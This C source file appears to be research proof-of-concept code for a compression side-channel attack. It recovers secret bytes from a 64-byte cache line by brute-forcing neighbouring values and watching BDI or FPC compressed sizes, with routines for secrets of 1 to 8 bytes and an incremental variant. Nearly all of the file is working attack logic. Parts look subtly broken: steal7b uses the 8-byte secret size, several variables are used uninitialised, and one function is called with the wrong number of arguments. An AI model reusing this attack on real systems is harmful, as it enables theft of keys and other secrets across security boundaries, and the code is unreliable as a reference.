#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include "../common/patterns.h"

#define LINESIZE 64

/* Given a buffer, inserts the value given, each step bytes from
   position start to position limit */
void put_data(char *buffer, char value, int start, int step, int limit) {
  for (int j = start; j < limit; j+=step) {
    buffer[j] = value;
  }
}

/* Given a destiny buffer and a source one, inserts the values of
   source at destiny, each step bytes from position start to position
   limit */
void recover(char *dest, char *src, int start, int step, int limit) {
  for (int j = start; j< limit; j+=step) {
    dest[j] = src[j];
  }
}

/* Writes the buffer in memory and gives back the compression of the
   line where the buffer has been written, both functions are
   abstracted */
int common_compression(char* buffer, unsigned (*compression)(), void(*write)(char*)){
  write(buffer);
  return compression();
}


/* Implementation to steal 1 byte from FPC algorithm */
int fpc_steal1b(char* original_buffer, char *answer, unsigned(*compression)(), void(*write)(char*)){
	int SECRETSIZE = 1;
	int BUFFERSIZE = LINESIZE-SECRETSIZE; // 63 bytes for a 64-byte cache line
	int size;
	
	/* Fill the line with the same byte and check its compressibility.
	 * When the secret byte is the same as the others on the line the
	 * compressed size will drop.
	 */

	char buffer[BUFFERSIZE];
	memcpy(buffer, original_buffer, BUFFERSIZE);
	unsigned char byte_initial = 0; // TODO: See what initial value should be put here.
	int final_size = 100;
	for (unsigned char byte = 1; byte != byte_initial; byte++){
		put_data(buffer, byte, 0, 1, BUFFERSIZE);
		size = common_compression(buffer, compression, write);
		printf("\r[%u]    compression: %u   ", byte, size);
		if (size < final_size) { 
			printf("[FPC] Found new minimum size: %d", size);
			final_size = size;
			answer[0] = byte;
		}
	}	
	if (final_size < size){
		printf("[FPC] Return size is %d with answer byte %u", final_size, answer[0]);
		return(0);
	}
	else{
		recover(buffer, original_buffer, 0, 1, BUFFERSIZE);
		printf("\n");
		return -1;
	}
}

/** Function stealXb, tries to colocate in the same line as a X byte
   secret, all possible values (brute force) until it gets the optimal
   compressibility of the line. These functions are optimized against
   BDI, so they've some heuristics to reduce the search space, these
   heuristics are explained on each function. Answer buffer gives the
   starting value to try in the search (that helps if some is
   previously known to it), the search is done incrementally. WHen the
   function runs it shows in stdout the current pattern being tested
   and flushes it if it's not correct, when it is it will be shown. */

/* Tries with all the possible 1-byte values: O(2**8) */
char steal1b(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 1;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  int size;
  
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);

  // Test the values
  unsigned char byte = answer[0];
  do {
    put_data(buffer, byte, 0, 1, BUFFERSIZE);

    size = common_compression(buffer, compression, write);
    printf("\r[%u]    compression: %u   ", byte, size);
    if (size == B8D0_SIZE) { printf("\n");
      answer[0] = byte;
      return 0;
    }
  } while (++byte != (unsigned char) answer[0]); // Until the byte value cycles back to the initial!
  recover(buffer, original_buffer, 0, 1, BUFFERSIZE);
  printf("\n");
  return -1;
}

/* Tries modifying each byte in 2 in the buffer until getting B2D1
   compression value, then gets the remaining byte thesting all
   possible values: O(2*(2**8)) */
char steal2b(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 2;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  int size;
  
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);

  // Test the values
  unsigned char b_1 = answer[1];
  do {
    put_data(buffer, b_1, 1, 2, BUFFERSIZE); // 2nd byte

    size = common_compression(buffer, compression, write);
    printf("\r[X,%u]    compression: %u   ", b_1, size);
    if (size == B2D1_SIZE ){
      answer[1] = b_1;
      // If found a better compression, infer which elements can improve it by alternating a value
      printf("\n");
      unsigned char b_2 = answer[0];
      do {
        put_data(buffer, b_2, 0, 2, BUFFERSIZE); // 1st byte
        size = common_compression(buffer, compression, write);
        printf("\r[%u,%u]     compression: %u    ", b_2, b_1, size);
        if (size == B8D0_SIZE) { printf("\n");
          answer[0] = b_2;
          return 0;
        }
      } while (++b_2 != (unsigned char) answer[0]);
      recover(buffer, original_buffer, 0, 2, BUFFERSIZE);
    }
  } while (++b_1 != (unsigned char) answer[1]);
  recover(buffer, original_buffer, 1, 2, BUFFERSIZE);
  printf("\n");
  return -1;
}

/* Sets a value value to be the same in all the line, then tries
   modifying each byte in 4 in the buffer until getting B4D2
   compression value, then does the same with the next byte until
   getting B4D1 compression and finally does the same for getting B8D0
   compression: O(3*(2**8)) */
// We consider key alignment to 4B, otherwise 2 bytes would need to be cracked at once
char steal3b (char* original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 3;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  int size;
  
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  
  // Test the values
  unsigned short arbitrary;
  put_data(buffer, arbitrary, 0, 4, BUFFERSIZE);
  unsigned char b_2 = answer[2];
  do {
    put_data(buffer, b_2, 3, 4, BUFFERSIZE);
    size = common_compression(buffer, compression, write);
    printf("\r[X,X,%u]     compression: %u    ", b_2, size);
    if (size == B4D2_SIZE){ printf("\n");
      answer[2] = b_2;
      unsigned char b_3 = answer[1];
      do {
        put_data(buffer, b_3, 2, 4, BUFFERSIZE);
        size = common_compression(buffer, compression, write);
        printf("\r[X,%u,%u]    compression: %u    ", b_3, b_2, size);
        if (size == B4D1_SIZE) { printf("\n");
          answer[1] = b_3;
          unsigned char b_4 = answer[0];
          do {
            put_data(buffer, b_4, 1, 4, BUFFERSIZE);
            size = common_compression(buffer, compression, write);
            printf("\r[%u,%u,%u]    compression: %u    ", b_4, b_3, b_2, size);
            if (size == B8D0_SIZE) { printf("\n");
              answer[0] = b_4;
              return 0;
            }
          } while (++b_4 != (unsigned char) answer[0]);
          recover(buffer, original_buffer, 1, 4, BUFFERSIZE);
        }
      } while (++b_3 != (unsigned char) answer[1]);
      recover(buffer, original_buffer, 2, 4, BUFFERSIZE);
    }
  } while (++b_2 != (unsigned char) answer[2]);
  recover(buffer, original_buffer, 3, 4, BUFFERSIZE);
  recover(buffer, original_buffer, 0, 4, BUFFERSIZE);
  printf("\n");
  write(original_buffer); // Write back original contents
  return -1;
}

/* Modifies the value of 2 bytes until getting B4D2 compression
   value, then does the same with the next byte until getting B4D1
   compression and finally does the same for getting B8D0 compression:
   O(2**16) */
char steal4b (char* original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 4;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  unsigned size;
  
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  
  // Test the values
  unsigned char b_1 = answer[3];
  do {
    put_data(buffer, b_1, 3, 4, BUFFERSIZE);
    unsigned char b_2 = answer[2];
    do {
      put_data(buffer, b_2, 2, 4, BUFFERSIZE);
      size = common_compression(buffer, compression, write);      
      printf("\r[X,X,%u,%u]     compression: %u    ", b_2, b_1, size);
      if (size == B4D2_SIZE){ printf("\n");
        answer[3] = b_1;
        answer[2] = b_2;
        unsigned char b_3 = answer[1];
        do {
          put_data(buffer, b_3, 1, 4, BUFFERSIZE);
          size = common_compression(buffer, compression, write);
          printf("\r[X,%u,%u,%u]    compression: %u    ", b_3, b_2, b_1, size);
          if (size == B4D1_SIZE) { printf("\n");
            answer[1] = b_3;
            unsigned char b_4 = answer[0];
            do {
              put_data(buffer, b_4, 0, 4, BUFFERSIZE);
              size = common_compression(buffer, compression, write);
              printf("\r[%u,%u,%u,%u]    compression: %u    ", b_4, b_3, b_2, b_1, size);
              if (size == B8D0_SIZE) { printf("\n");
                answer[0] = b_4;
                return 0;
              }
            } while ( ++b_4 != (unsigned char) answer[0]);
            recover(buffer, original_buffer, 0, 4, BUFFERSIZE);
          }
        } while ( ++b_3 != (unsigned char) answer[1]);
        recover(buffer, original_buffer, 1, 4, BUFFERSIZE);
      }
    } while ( ++b_2 != (unsigned char) answer[2]);
    recover(buffer, original_buffer, 2, 4, BUFFERSIZE);
  } while ( ++b_1 != (unsigned char) answer[3]);
  recover(buffer, original_buffer, 3, 4, BUFFERSIZE);
  printf("\n");
  write(original_buffer); // Write back original contents
  return -1;
}

/* Sets the same value accross all the buffer to leave only different
   the 5 bytes of the secret, then modifies the value of 2 bytes until
   getting B4D2 compression, by splitting the 5-byte segment into a
   4-byte and 1 byte, then the base of the 4-byte segment can be
   guessed without overwritting the secret, then gets each one of the
   remaining bytes independently, by getting the compression sizes of
   B8D2, B8D1 and B8D0: O(2**16) */
// Depending on the alignment of the secret, the bytes in the buffer that must be modified for the search of B4D2 would change.
char steal5b(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){

  int SECRETSIZE = 5;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  int size;
  
  // Test the values
  unsigned char arbitrary; // To provoke the B8D2 pattern
  put_data(buffer, arbitrary, 0, 8, BUFFERSIZE);

  unsigned char b_3 = answer[2];
  do {
    put_data(buffer, b_3, 1, 4, BUFFERSIZE);
    unsigned char b_4 = answer[3];
    do {
      put_data(buffer, b_4, 2, 4, BUFFERSIZE);
      size = common_compression(buffer, compression, write);
      printf("\r[X,X,%u,%u,X]     compression: %u       ", b_3, b_4, size);
      if (size == B4D2_SIZE){
        printf("\n");
        unsigned char b_5 = answer[4];
        do {
          put_data(buffer, b_5, 7, 8, BUFFERSIZE);
          size = common_compression(buffer, compression, write);
          printf("\r[X,X,%u,%u,%u]     compression: %u        ", b_3, b_4, b_5, size);
          if (size == B8D2_SIZE) {
            printf("\n");
            unsigned char b_2 = answer[1];
            do {
              put_data(buffer, b_2, 4, 8, BUFFERSIZE);
              size = common_compression(buffer, compression, write);
              printf("\r[X,%u,%u,%u,%u]     compression: %u          ", b_2, b_3, b_4, b_5, size);
              if (size == B8D1_SIZE) {
                printf("\n");
                unsigned char b_1 = answer[0];
                do {
                  put_data(buffer, b_1, 3, 8, BUFFERSIZE);
                  size = common_compression(buffer, compression, write);
                  printf("\r[%u,%u,%u,%u,%u]     compression: %u          ", b_1, b_2, b_3, b_4, b_5, size);
                  if (size == B8D0_SIZE) {
                    printf("\n");
                    answer[4] = b_5;
                    answer[3] = b_4;
                    answer[2] = b_3;
                    answer[1] = b_2;
                    answer[0] = b_1;
                    return 0;
                  }
                } while ( ++b_1 != (unsigned char) (answer[0]));
                recover(buffer, original_buffer, 3, 8, BUFFERSIZE);
              }
            } while ( ++b_2 != (unsigned char) answer[1]);
            recover(buffer, original_buffer, 4, 8, BUFFERSIZE);
          }
        } while ( ++b_5 != (unsigned char) answer[4]);
        recover(buffer, original_buffer, 7, 8, BUFFERSIZE);
      }
    } while ( ++b_4 != (unsigned char) answer[3]);
    recover(buffer, original_buffer, 2, 4, BUFFERSIZE);
  } while ( ++b_3 != (unsigned char) answer[2]);
  recover(buffer, original_buffer, 1, 4, BUFFERSIZE);
  recover(buffer, original_buffer, 0, 8, BUFFERSIZE);
  printf("\n");
  return -1;
}

/* Gets 2 middle bytes in the same way as steal5b, then gets the 2
   first bytes at once by achieving B8D2 compression, for the
   remaining bytes, it gets them independently, by achieving the
   compression sizes of B8D1 and B8D0: O(2*(2**16)) */
// Depending on the alignment of the secret, the bytes in the buffer that must be modified for the search of B4D2 would change. Being the case too that The search must be over 4 bytes at once, in that case with steal8b complexity)
char steal6b(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 6;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  int size;
  
  // Test the values
  unsigned char b_3 = answer[2];
  do {
    put_data(buffer, b_3, 0, 4, BUFFERSIZE);
    unsigned char b_4 = answer[3];
    do {
      put_data(buffer, b_4, 1, 4, BUFFERSIZE);
      size = common_compression(buffer, compression, write);
      printf("\r[X,X,%u,%u,X,X]     compression: %u       ", b_3, b_4, size);
      if (size == B4D2_SIZE){
        printf("\n");
        unsigned char b_5 = answer[4];
        do {
          put_data(buffer, b_5, 7, 8, BUFFERSIZE);
          unsigned char b_6 = answer[5];
          do {
            put_data(buffer, b_6, 6, 8, BUFFERSIZE);
            size = common_compression(buffer, compression, write);
            printf("\r[X,X,%u,%u,%u,%u]     compression: %u        ", b_3, b_4, b_5, b_6, size);
            if (size == B8D2_SIZE) {
              printf("\n");
              unsigned char b_2 = answer[1];
              do {
                put_data(buffer, b_2, 3, 8, BUFFERSIZE);
                size = common_compression(buffer, compression, write);
                printf("\r[X,%u,%u,%u,%u,%u]     compression: %u          ", b_2, b_3, b_4, b_5, b_6, size);
                if (size == B8D1_SIZE) { // B8D1 size
                  printf("\n");
                  unsigned char b_1 = answer[0];
                  do {
                    put_data(buffer, b_1, 2, 8, BUFFERSIZE);
                    size = common_compression(buffer, compression, write);
                    printf("\r[%u,%u,%u,%u,%u,%u]     compression: %u          ", b_1, b_2, b_3, b_4, b_5, b_6, size);
                    if (size == B8D0_SIZE) {
                      printf("\n");
                      answer[5] = b_6;
                      answer[4] = b_5;
                      answer[3] = b_4;
                      answer[2] = b_3;
                      answer[1] = b_2;
                      answer[0] = b_1;
                      return 0;
                    }
                  } while ( ++b_1 != (unsigned char) answer[0]);
                  recover(buffer, original_buffer, 2, 8, BUFFERSIZE);
                }
              }        while ( ++b_2 != (unsigned char) answer[1]);
              recover(buffer, original_buffer, 3, 8, BUFFERSIZE);
            }
          } while ( ++b_6 != (unsigned char) answer[5]);
          recover(buffer, original_buffer, 6, 8, LINESIZE);
        } while ( ++b_5 != (unsigned char) answer[4]);
        recover(buffer, original_buffer, 7, 8, LINESIZE);
      }
    } while ( ++b_4 != (unsigned char) answer[3]);
    recover(buffer, original_buffer, 0, 4, LINESIZE);
  } while ( ++b_3 != (unsigned char) answer[2]);
  recover(buffer, original_buffer, 1, 4, LINESIZE);
  printf("\n");
  return -1;
}

/* Gets the first 3 bytes by achieving B8D4 compression size, then
   gets the 2 first next ones at once by achieving B8D2 compression, for
   the remaining bytes, it gets them independently, by achieving the
   compression sizes of B8D1 and B8D0: O(2**24) */
// Depending on the alignment the algorithm that should be used can be steal8b
char steal7b(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 8;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  int size;

  unsigned char arbitrary;
  put_data(buffer, arbitrary, 0, 8, BUFFERSIZE);

  unsigned char b_5 = answer[4];
  do {
    put_data(buffer, b_5, 5, 8, BUFFERSIZE);
    unsigned char b_6 = answer[5];
    do {
      put_data(buffer, b_6, 6, 8, BUFFERSIZE);
      unsigned char b_7 = answer[6];
      do {
        put_data(buffer, b_7, 7, 8, BUFFERSIZE);
          size = common_compression(buffer, compression, write);
          printf("\r[X,X,X,X,%u,%u,%u]     compression: %u       ", b_5, b_6, b_7, size);
          if (size == B8D4_SIZE){
            printf("\n");
            unsigned char b_4 = answer[3];
            do {
              put_data(buffer, b_4, 4, 8, BUFFERSIZE);
              unsigned char b_3 = answer[2];
              do {
                put_data(buffer, b_3, 3, 8, BUFFERSIZE);
                size = common_compression(buffer, compression, write);
                printf("\r[X,X,%u,%u,%u,%u,%u]     compression: %u       ", b_3, b_4, b_5, b_6, b_7, size);
                if (size == B8D2_SIZE){
                  printf("\n");
                  unsigned char b_2 = answer[1];
                  do {
                    put_data(buffer, b_2, 2, 8, BUFFERSIZE);
                    size = common_compression(buffer, compression, write);
                    printf("\r[X,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_2, b_3, b_4, b_5, b_6, b_7, size);
                    if (size == B8D1_SIZE){
                      printf("\n");
                      unsigned char b_1 = answer[0];
                      do {
                        put_data(buffer, b_1, 1, 8, BUFFERSIZE);
                        size = common_compression(buffer, compression, write);
                        printf("\r[%u,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_1, b_2, b_3, b_4, b_5, b_6, b_7, size);
                        if (size == B8D0_SIZE){
                          printf("\n");
                          answer[6] = b_7;
                          answer[5] = b_6;
                          answer[4] = b_5;
                          answer[3] = b_4;
                          answer[2] = b_3;
                          answer[1] = b_2;
                          answer[0] = b_1;
                          return 0;
                        }
                      }        while ( ++b_1 != (unsigned char) answer[0]);
                      recover(buffer, original_buffer, 1, 8, LINESIZE);                  
                    }
                  } while ( ++b_2 != (unsigned char) answer[1]);
                  recover(buffer, original_buffer, 2, 8, LINESIZE);                  
                }
              }        while ( ++b_3 != (unsigned char) answer[2]);
              recover(buffer, original_buffer, 3, 8, LINESIZE);
            } while ( ++b_4 != (unsigned char) answer[3]);
            recover(buffer, original_buffer, 4, 8, LINESIZE);
          }
      } while ( ++b_7 != (unsigned char) answer[6]);
      recover(buffer, original_buffer, 7, 8, LINESIZE);
    } while ( ++b_6 != (unsigned char) answer[5]);
    recover(buffer, original_buffer, 6, 8, LINESIZE);
  } while ( ++b_5 != (unsigned char) answer[4]);
  recover(buffer, original_buffer, 5, 8, LINESIZE);
  recover(buffer, original_buffer, 0, 8, LINESIZE);
  printf("\n");
  return -1;
}

/* Gets the first 4 bytes by achieving B8D4 compression size, then
   gets the 2 first next ones at once by achieving B8D2 compression, for
   the remaining bytes, it gets them independently, by achieving the
   compression sizes of B8D1 and B8D0: O(2**32) */
// Depending on the alignment the algorithm that should be used can be steal8b
char steal8b(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*)){
  int SECRETSIZE = 8;
  int BUFFERSIZE = LINESIZE-SECRETSIZE;
  char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  int size;

  unsigned char b_5 = answer[4];
  do {
    put_data(buffer, b_5, 4, 8, BUFFERSIZE);
    unsigned char b_6 = answer[5];
    do {
      put_data(buffer, b_6, 5, 8, BUFFERSIZE);
      unsigned char b_7 = answer[6];
      do {
        put_data(buffer, b_7, 6, 8, BUFFERSIZE);
        unsigned char b_8 = answer[7];
        do {
          put_data(buffer, b_8, 7, 8, BUFFERSIZE);
          size = common_compression(buffer, compression, write);
          printf("\r[X,X,X,X,%u,%u,%u,%u]     compression: %u       ", b_5, b_6, b_7, b_8, size);
          if (size == B8D4_SIZE){
            printf("\n");
            unsigned char b_4 = answer[3];
            do {
              put_data(buffer, b_4, 3, 8, BUFFERSIZE);
              unsigned char b_3 = answer[2];
              do {
                put_data(buffer, b_3, 2, 8, BUFFERSIZE);
                size = common_compression(buffer, compression, write);
                printf("\r[X,X,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_3, b_4, b_5, b_6, b_7, b_8, size);
                if (size == B8D2_SIZE){
                  printf("\n");
                  unsigned char b_2 = answer[1];
                  do {
                    put_data(buffer, b_2, 1, 8, BUFFERSIZE);
                    size = common_compression(buffer, compression, write);
                    printf("\r[X,%u,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_2, b_3, b_4, b_5, b_6, b_7, b_8, size);
                    if (size == B8D1_SIZE){
                      printf("\n");
                      unsigned char b_1 = answer[0];
                      do {
                        put_data(buffer, b_1, 0, 8, BUFFERSIZE);
                        size = common_compression(buffer, compression, write);
                        printf("\r[%u,%u,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_1, b_2, b_3, b_4, b_5, b_6, b_7, b_8, size);
                        if (size == B8D0_SIZE){
                          printf("\n");
                          answer[7] = b_8;
                          answer[6] = b_7;
                          answer[5] = b_6;
                          answer[4] = b_5;
                          answer[3] = b_4;
                          answer[2] = b_3;
                          answer[1] = b_2;
                          answer[0] = b_1;
                          return 0;
                        }
                      }        while ( ++b_1 != (unsigned char) answer[0]);
                      recover(buffer, original_buffer, 0, 8, LINESIZE);
                    }
                  } while ( ++b_2 != (unsigned char) answer[1]);
                  recover(buffer, original_buffer, 1, 8, LINESIZE);                  
                }
              }        while ( ++b_3 != (unsigned char) answer[2]);
              recover(buffer, original_buffer, 2, 8, LINESIZE);
            } while ( ++b_4 != (unsigned char) answer[3]);
            recover(buffer, original_buffer, 3, 8, LINESIZE);
          }
        } while ( ++b_8 != (unsigned char) answer[7]);
        recover(buffer, original_buffer, 7, 8, LINESIZE);
      } while ( ++b_7 != (unsigned char) answer[6]);
      recover(buffer, original_buffer, 6, 8, LINESIZE);
    } while ( ++b_6 != (unsigned char) answer[5]);
    recover(buffer, original_buffer, 5, 8, LINESIZE);
  } while ( ++b_5 != (unsigned char) answer[4]);
  recover(buffer, original_buffer, 4, 8, LINESIZE);
  printf("\n");
  return -1;
}

// Given the ammount of bytes X to steal calls the function stealXb
char steal(char *original_buffer, char *answer, unsigned (*compression)(), void(*write)(char*), int bytes, int comp_algo){
  if (comp_algo == 0){ // comp_algo = 0 => BDI
  	switch(bytes){
  	case 1: return steal1b(original_buffer, answer, compression, write);
  	case 2: return steal2b(original_buffer, answer, compression, write);
  	case 3: return steal3b(original_buffer, answer, compression, write);
  	case 4: return steal4b(original_buffer, answer, compression, write);
  	case 5: return steal5b(original_buffer, answer, compression, write);
  	case 6: return steal6b(original_buffer, answer, compression, write);
  	case 7: return steal7b(original_buffer, answer, compression, write);
  	case 8: return steal8b(original_buffer, answer, compression, write);
  	default: printf("That amount of bytes is not possible to extract\n");
  	}
  }
  else{ // comp_algo = 1 => FPC
	printf("Gonna call fpc_steal1b rn bro");
	return fpc_steal1b(original_buffer, answer, compression, write);
  }
  return -1;
}

/** Used for stealing the bytes 1 by one, due that we can overwrite
    the secret and it will be rewritten. This is imposed as a
    constraint), but also this improves the complexity for retrieving
    the secret value. It's always expected to get 8BD0 compression
    size: O(b*(2**8)) with b being the lengthof the secret in bytes*/
char steal_incremental(char *original_buffer, char *answer, unsigned (*compression)(), void(*write_on_size)(char*, int, char*, int), int bytes){
  int BUFFERSIZE = LINESIZE;
  unsigned char buffer[BUFFERSIZE];
  memcpy(buffer, original_buffer, BUFFERSIZE);
  int size1, size2; // Calculate twice the size to avoid errors caused by the noise

  printf("First byte...\n");

  unsigned char b_1 = answer[0];
  do {
    put_data(buffer, b_1, 0, 1, BUFFERSIZE);
    void access(){write_on_size(buffer, 1, 1);}
    size1 = compression(&access); size2 = compression(&access);
    printf("\r[X,X,X,X,X,X,X,%u]     compression: %u  ", b_1, size1);
    if(size1 == size2 && size1 == B8D0_SIZE){
      printf("\n");
      if(bytes == 1) {answer[0] = b_1; return 0;}      
      unsigned char b_2 = answer[1];
      do {
        put_data(buffer, b_2, 0, 2, BUFFERSIZE);
        void access(){write_on_size(buffer, 2,2);}
        size1 = compression(&access); size2 = compression(&access);
        printf("\r[X,X,X,X,X,X,%u,%u]     compression: %u       ", b_2, b_1, size1);
        if(size1 == size2 && size1 == B8D0_SIZE){
          printf("\n");
          if(bytes == 2) {answer[0] = b_1; answer[1] = b_2; return 0;}

          unsigned char b_3 = answer[2];
          do {
            put_data(buffer, b_3, 1, 4, BUFFERSIZE);
            void access(){write_on_size(buffer, 3, 3);}
            size1 = compression(&access); size2 = compression(&access);
            printf("\r[X,X,X,X,X,%u,%u,%u]     compression: %u      ", b_3, b_2, b_1, size1);

            if(size1 == size2 && size1 == B8D0_SIZE){
              printf("\n");
              if(bytes == 3) {answer[0] = b_1; answer[1] = b_2; answer[2] = b_3; return 0;}

              unsigned char b_4 = answer[3];
              do {
                put_data(buffer, b_4, 0, 4, BUFFERSIZE);
                void access(){write_on_size(buffer, 4, 4);}
                size1 = compression(&access); size2 = compression(&access);
                printf("\r[X,X,X,X,%u,%u,%u,%u]     compression: %u      ", b_4, b_3, b_2, b_1, size1);

                if(size1 == size2 && size1 == B8D0_SIZE){
                  printf("\n");
                  if(bytes == 4) {answer[0] = b_1; answer[1] = b_2; answer[2] = b_3; answer[3] = b_4; return 0;}

                  unsigned char b_5 = answer[4];
                  do {
                    put_data(buffer, b_5, 3, 8, BUFFERSIZE);
                    void access(){write_on_size(buffer, 5, 5);}
                    size1 = compression(&access); size2 = compression(&access);
                    printf("\r[X,X,X,%u,%u,%u,%u,%u]     compression: %u       ", b_5, b_4, b_3, b_2, b_1, size1);
                    if(size1 == size2 && size1 == B8D0_SIZE){
                      printf("\n");
                      if(bytes == 5) {answer[0] = b_1; answer[1] = b_2; answer[2] = b_3; answer[3] = b_4; answer[4] = b_5; return 0;}
                      
                      unsigned char b_6 = answer[5];
                      do {
                        put_data(buffer, b_6, 2, 8, BUFFERSIZE);
                        void access(){write_on_size(buffer, 6, 6);}
                        size1 = compression(&access); size2 = compression(&access);
                        printf("\r[X,X,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_6, b_5, b_4, b_3, b_2, b_1, size1);
                        if(size1 == size2 && size1 == B8D0_SIZE){
                          printf("\n");
                          if(bytes == 6) {answer[0] = b_1; answer[1] = b_2; answer[2] = b_3; answer[3] = b_4; answer[4] = b_5; answer[5] = b_6; return 0;}
                          
                          unsigned char b_7 = answer[6];
                          do {
                            put_data(buffer, b_7, 1, 8, BUFFERSIZE);
                            void access(){write_on_size(buffer, 7, 7);}
                            size1 = compression(&access); size2 = compression(&access);
                            printf("\r[X,%u,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_7, b_6, b_5, b_4, b_3, b_2, b_1, size1);
                            if(size1 == size2 && size1 == B8D0_SIZE){
                              printf("\n");
                              if(bytes == 7) {answer[0] = b_1; answer[1] = b_2; answer[2] = b_3; answer[3] = b_4; answer[4] = b_5;  answer[5] = b_6; answer[6] = b_7;return 0;}
                              
                              unsigned char b_8 = answer[7];
                              do {
                                put_data(buffer, b_8, 0, 8, BUFFERSIZE);
                                void access(){write_on_size(buffer, 8, 8);}
                                size1 = compression(&access); size2 = compression(&access);
                                printf("\r[%u,%u,%u,%u,%u,%u,%u,%u]     compression: %u       ", b_8, b_7, b_6, b_5, b_4, b_3, b_2, b_1, size1);
                                if(size1 == size2 && size1 == B8D0_SIZE){
                                  printf("\n");
                                  answer[0] = b_1; answer[1] = b_2; answer[2] = b_3; answer[3] = b_4; answer[4] = b_5;  answer[5] = b_6; answer[6] = b_7; answer[7] = b_8;
                                  return 0;
                                }
                              } while ( ++b_8 != (unsigned char) answer[7]);
                            }
                          } while ( ++b_7 != (unsigned char) answer[6]);
                        }
                      } while ( ++b_6 != (unsigned char) answer[5]);
                    }
                  } while ( ++b_5 != (unsigned char) answer[4]);
                }
              } while ( ++b_4 != (unsigned char) answer[3]);
            }
          } while ( ++b_3 != (unsigned char) answer[2]);
          //recover(buffer, original_buffer, , 2, LINESIZE);
        }
      } while ( ++b_2 != (unsigned char) answer[1]);
      //recover(buffer, original_buffer, 1, 2, LINESIZE);
    }
  } while ( ++b_1 != (unsigned char) answer[0]);
  //recover(buffer, original_buffer, 0, 1, LINESIZE);
  printf("\n");
  return -1;
}
